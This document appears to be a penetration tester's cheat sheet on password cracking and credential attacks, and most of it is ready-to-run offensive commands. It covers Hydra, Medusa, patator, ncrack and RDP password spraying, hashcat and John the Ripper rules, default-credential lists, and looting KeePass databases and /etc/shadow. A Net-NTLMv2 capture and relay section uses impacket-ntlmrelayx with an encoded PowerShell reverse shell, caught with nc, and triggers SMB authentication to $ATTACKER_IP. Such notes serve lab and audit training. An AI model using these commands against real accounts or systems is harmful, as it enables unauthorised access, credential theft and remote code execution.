# Password cracking



{% hint style="info" %}
For web applications, always consider as users both "admin" and otherwise also "user" if no clue.
{% endhint %}

{% hint style="danger" %}
**hashcat** > Retry without -O since that is discarding longer passwords
{% endhint %}

## Online Hash Crack

{% hint style="info" %}
If password is 8+ length you have to pay, it is a professional service to crack hashes, good for enterprise audits.
{% endhint %}

[https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com/)

## Default Passwords

```bash
http://www.digininja.org/projects/cewl.php
http://www.openwall.com/john/
http://www.openwall.com/john/doc/RULES.shtml

# Default passwords for various products
• https://cirt.net/passwords
• https://default-password.info/
• https://datarecovery.com/rd/default-passwords/


#Default passwords
admin:admin
admin:password
administrator:password
$username:$username
guest:guest
backup:backup
root:root
root:toor
$MachineName:$MachineName
admin:$MachineName
root:$MachineName
$MachineName:password
WHATEVER:(blank)
```

## Password Spraying Cases

[https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)

* The current season followed by the current year (SeasonYear). For example, **Fall2020**, **Spring2021**, etc.
* The current month followed by the current year (MonthYear). For example, **November2020**, **March2021**, etc.
* Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.

## Wordlists

```bash
https://github.com/clem9669/wordlists
# Usernames
https://github.com/funkandwagnalls/pythonpentest/blob/master/username_generator.py
```

## Hydra

{% code overflow="wrap" %}
```bash
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra #Supported modules by THC-Hydra
hydra http-form-post -U #Additional information about the http-form-post module
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -fb
:F=Login failed # what we see when login fails
:S=logout.php # word we see on the source code when it is successful

# Use user:pass wordlist file to crack
hydra -C combine.txt -f ftp://$IP 
```
{% endcode %}

## Hashcat

{% code overflow="wrap" fullWidth="true" %}
```bash
0       MD5
400     phpass
600     PHP
1000 	NTLM
5600    NetNTLMv2
13100 	Keberos etype 23
2100  	Mscache DCC2


# Better to use it on OS host (quicker with GPU, compatible with Windows)
hashcat -m $MODE $HASH $DICT
hashcat.exe -m 1800 -a 0 -o cracked.txt hash.txt rockyou.txt # sha512
# -m hash type (MD5, sha1...) -a 0 --> dict attack -o outputfile once cracked

# HASHCAT RULES
https://github.com/clem9669/hashcat-rule
https://hashcat.net/wiki/doku.php?id=rule_based_attack
# Good option to use rules (change the wordlist since rockyou with rules might be huge):
hashcat -m 13100 crack.txt /usr/share/wordlists/rockyou.txt /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule -O
https://hashcat.net/wiki/doku.php?id=rule_based_attack
# Add at the end of each password !1 and capitalize the first letter
cat demo.rule   
$! $1 c
hashcat -r demo.rule --stdout demo.txt # to check the rule is well applied
hashcat -m $MODE hashes rockyou.txt -r demo.rule 
# YOUR CUSTOM RULE MIGHT BE A FILE WITH THIS (IN 2 SEPARATED LINES):
:
$!
# This means to use the current words and also the same ones appending a "!"
# CREATE A CUSTOM WORDLIST 
hashcat -m 0 wordlist -r best64.rule -r custom.rule


# Create a wordlist combination w/ Hashcat
./combinator.bin colors.txt numbers.txt > wordlist.txt
```
{% endcode %}

## bcrypt

<pre class="language-sh"><code class="lang-sh"><strong># Check if a hash = plaintext password (to not waste time for cracking it)
</strong>python3
>>> bcrypt.checkpw(b'mypassword', b'$2y$10...')

# bcrypt generator
https://appdevtools.com/bcrypt-generator
</code></pre>

## cewl

```bash
# -d Depth 3 and -m minimum 6 chars for a password (uncommon to find shorter ones)
cewl $IP[/$PATH] -d 3 -m 6 -w cewl.txt

# INCLUDE WORDS WITH NUMBERS 
cewl -w cewl --with-numbers -m 8 $URL
```

## Crack zip/rar password

```bash
unzip file.zip 

# To check if the file is encrypted and if we could crack the encryption method
7z l -slt file.zip

# Hashcat
Remove the filename before and after the hash to make it work

fcrackzip -u -D -p passwords.txt sample.zip
# -u use unzip to weed out wrong passwords
# -D use a dictionary
# -p use string as initial password/file 

zipcracker-ng -f backup.zip -w /usr/share/dict/rockyou.txt

zip2john [options] [zip file] > [output file]
# Example Usage
zip2john zipfile.zip > zip_hash.txt
zip2john or rar2john → zip2john file.zip zip.hashes / john zip.hashes

# SAME WITH rar2john
```

## John

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.openwall.com/john/
sudo john hash.txt --format=NT # bruteforce cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT # dictionary cracking
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT # Cracking using password mutation rules

# Preparing Linux password hash (/etc/shadow) for cracking
unshadow passwd-file.txt shadow-file.txt
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
# Cracking a Linux password hash using John the Ripper
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# SINGLE CRACK MODE
john --single --format=[format] [path to file]
# --single - This flag lets john know you want to use the single hash cracking mode.
# Example Usage:
john --single --format=raw-sha256 hashes.txt
# Change the hash from
1efee03cdcb96d90ad48ccc7b8666033
# to
mike:1efee03cdcb96d90ad48ccc7b8666033
```
{% endcode %}

## Rules / Wordlists

{% hint style="info" %}
`rockyou-30000.rule` is a very good rule to use along with rockyou.txt
{% endhint %}

{% tabs %}
{% tab title="John1" %}
{% code overflow="wrap" %}
```bash
https://www.openwall.com/john/doc/RULES.shtml

# To be able to use the previously created rules in JtR, we need to adda name for the rules and append them to the /etc/john/john.conf configuration file.
cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash

# We use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
# Az - Takes the word and appends it with the characters you define
# A0 - Takes the word and prepends it with the characters you define
# c - Capitalises the character positionally

# Capitalise the first  letter - c
# Append to the end of the word - Az
# A number in the range 0-9 - [0-9]
# Followed by a symbol that is one of [!£$%@]

cAz"[0-9] [!£$%@]"
# Another example --> all capital laters to the end of the word
Az"[A-Z]"

john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
```
{% endcode %}
{% endtab %}

{% tab title="John2" %}
{% code overflow="wrap" %}
```bash
https://www.openwall.com/john/doc/RULES.shtml
# To see all rules
cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
# One of the best rules are KoreLogic and best64
john --wordlist=/tmp/single-password-list.txt --rules=KoreLogic --stdout | wc -l
# Custom rules (add those lines to /etc/john/john.conf
[List.Rules:THM-Password-Attacks] 
Az"[0-9][0-9]" ^[!@#$] # Az is a single word from the original wordlist, "[0-9][0-9]" appends two digits ^[!@#$] adds one of those symbols at the beginning
john --wordlist=/tmp/single-password-list.txt --rules=THM-Password-Attacks --stdout | wc -l

[List.Rules:mycustomrule]
# Rules to add years and a symbol + capitalize for each password
:$2$0$2$[0-4]$[!@#$]
c$2$0$2$[0-4]$[!@#$]


kali@kali:~$ sudo nano /etc/john/john.conf ... 
# Wordlist mode rules [List.Rules:Wordlist] 
# Try words as they are : 
# Lowercase every pure alphanumeric word 
-c >3 !?X l Q 
# Capitalize every pure alphanumeric word 
-c (?a >2 !?X c Q 
# Lowercase and pluralize pure alphabetic words 
... 
# Try the second half of split passwords 
-s x_ 
-s-c x_ M l Q 
# Add two numbers to the end of each password  
$[0-9]$[0-9]

john --wordlist=mywordlist.txt --rules --stdout > mutated.txt
```
{% endcode %}
{% endtab %}

{% tab title="maskprocessor" %}
[https://hashcat.net/wiki/doku.php?id=maskprocessor](https://hashcat.net/wiki/doku.php?id=maskprocessor)
{% endtab %}

{% tab title="crunch" %}
[https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/](https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/)

```bash
@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters 
^ Special characters including space

crunch 6 6 -t pass%%

# Generate a wordlist with min and max of 8 chars, following the rules of
1 upper case, two special characters and 3 numeric characters
crunch 8 8 -t ,@@^^%%%

# Define a charset of only digits and A-F
crunch 4 6 0123456789ABCDEF -o crunch.txt

# Use a pre-definded charset
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
```
{% endtab %}

{% tab title="CUPP" %}
[https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)
{% endtab %}
{% endtabs %}

## Keepass

{% code overflow="wrap" fullWidth="true" %}
```bash
https://web.archive.org/web/20220123003835/https://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/
https://web.archive.org/web/20220122225230/http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/
https://github.com/GhostPack/KeeThief

# Loot on Windows
Get-ChildItem -Path C:\ -Include @("*kee*.exe", "*.kdb*") -Recurse -ErrorAction SilentlyContinue | Select-Object -Expand FullName | fl
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# Before cracking, remove the "Database:" string from the hash
hashcat -m 13400 hashes rockyou.txt -r rockyou-30000.rule

sudo apt-get install -y kpcli # Install keepass tools like keepass2john
keepass2john file.kdbx > hash # The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
# The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash

# keepass2john do not work if Keepass version > 2.36 as it is unsupported on John. No way to get it since hashcat needs a hash :(
# A way to overcome this via bruteforce is https://github.com/r3nt0n/keepass4brute
```
{% endcode %}

## Password Hashes

We can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the _SeDebugPrivilege_ access right enabled.

## Cracking Net-NTLMv2

If we've obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server. For example, we can simply run **ls \\\LOCAL\_IP\SHARE** in PowerShell (assuming our Responder is listening on that IP). If we don't have code execution, we can also use other vectors to force an authentication. For example, when we discover a **file upload/URL form in a web application** on a Windows server, we can try to enter a non-existing file with a **UNC path** like '\LHOST\SHARE\nonexistent.txt or \\\\\\\LHOST\\\SHARE\\\nonexistent.txt'. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

```bash
sudo responder -I $interface
# To catch a Net-NTLMv2 hash
dir \\192.168.119.2\test
\\192.168.119.2\share
```

## Relaying Net-NTLMv2

In case we have access to a user that is unprivileged on one host but may exist and be privileged on another host. We could relay the authentication from one host to another.

{% hint style="info" %}
the target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local _Administrator_ user for the relay attack.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```bash
# setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target (after -enc comes base64-PS-revshell-one-liner)
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.50 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
# now we prepare to catch our revshell on the desired port
rlwrap nc -lvnp 443
# And from the already got shell or from a file upload / other method that allows us to specify UNC path, we trigger the SMB authentication to our attacking machine
dir \\$ATTACKER_IP\test
\\\\$ATTACKER_IP\\test
# We should see an incoming connection on (relay-attack)  to execute the reverse shell on the target host
```
{% endcode %}

## PDF

```bash
pdf2john infrastructure.pdf > hashes
hashcat hashes rockyou.txt -O --force
```

## MD5 Collision

[https://github.com/thereal1024/python-md5-collision](https://github.com/thereal1024/python-md5-collision)

## Cracking time

{% code overflow="wrap" fullWidth="true" %}
```bash
Cracking time = keyspace / hash rate
keyspace = number of different caracters the password can have (X) power number of password's chars (Y)  = XY

# Using all latin alphabet plus digits as chars of the password, for a 5-char length password
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**5)"
# result determines how many unique variations can be generated for a five-character password with this character set

Hash rate is hash calculations / second. To find it, use Hashcat's benchmark mode for a specific hash algorithm
Differentiate CPU benchmark and GPU benchmark (second applies when there is a GPU attached to hashcat)
1 MH/s equals 1,000,000 hashes per second
```
{% endcode %}

## Rockstatic

Way bigger wordlist than rockyou.

## Medusa

{% code overflow="wrap" fullWidth="true" %}
```bash
medusa -d # Medusa options and modules
# HTTP bruteforce
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
# SSH bruteforce
medusa -h 192.168.0.0 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0
```
{% endcode %}

## patator

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
<strong>
</strong><strong>patator http_fuzz url=https://172.16.10.248:8081/lib/crud/userprocess.php method=POST body='user=admin&#x26;pass=COMBO00&#x26;sublogin=1' 0=/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt after_urls=https://172.16.10.248:8081/dashboard.php accept_cookie=1 follow=1 max_follow=2 -x ignore:clen=5878
</strong></code></pre>

## ncrack - SSH bruteforce

```bash
ncrack 192.168.120.0 -U users.txt -P users.txt -p ssh -f -v
```

## RDP

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/xFreed0m/RDPassSpray
python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt # -d domain -T targetlist
# Crowbar - use only one thread (-n 1) otherwise it's not reliable
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
{% endcode %}

## Outlook web access (OWA) portal

Tools:

[https://github.com/blacklanternsecurity/TREVORspray](https://github.com/blacklanternsecurity/TREVORspray)

[https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

[MailSniper](https://github.com/dafthack/MailSniper)

## GPG

<pre class="language-bash"><code class="lang-bash">https://exploit-notes.hdks.org/exploit/cryptography/algorithm/pgp/
https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key
https://www.howtogeek.com/427982/how-to-encrypt-and-decrypt-files-with-gpg-on-linux/
<strong>
</strong>##### To decrypt files having public key (.key,.asc) and private key encrypted (.gpg)

gpg2john over .asc/.key files

<strong>gpg --import tryhackme.key
</strong>
gpg --decrypt message.gpg

# ALSO TO DECRYPT WITH PASSPHRASE
gpg --batch --passphrase $PASSPHRASE -d $FILE_TO_DECRYPT
</code></pre>

## References

{% code overflow="wrap" fullWidth="true" %}
```
https://github.com/Ganapati/RsaCtfTool
https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/
https://robertheaton.com/2014/03/27/how-does-https-actually-work/
https://www.gnupg.org/gph/de/manual/r1023.html
https://docs.google.com/viewerng/viewer?url=https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8105.pdf
```
{% endcode %}

{% embed url="https://www.youtube.com/watch?v=O4xNJsjtN6E" %}
